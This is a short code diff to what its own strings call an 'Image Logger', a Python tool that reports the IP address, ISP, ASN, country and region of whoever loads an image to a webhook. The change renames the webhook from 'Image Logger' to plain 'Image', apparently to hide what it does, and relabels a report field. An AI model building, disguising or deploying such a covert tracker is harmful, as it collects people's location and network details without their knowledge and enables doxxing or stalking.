@@ -18,7 +18,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Image", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -152,7 +152,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **SimProvider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
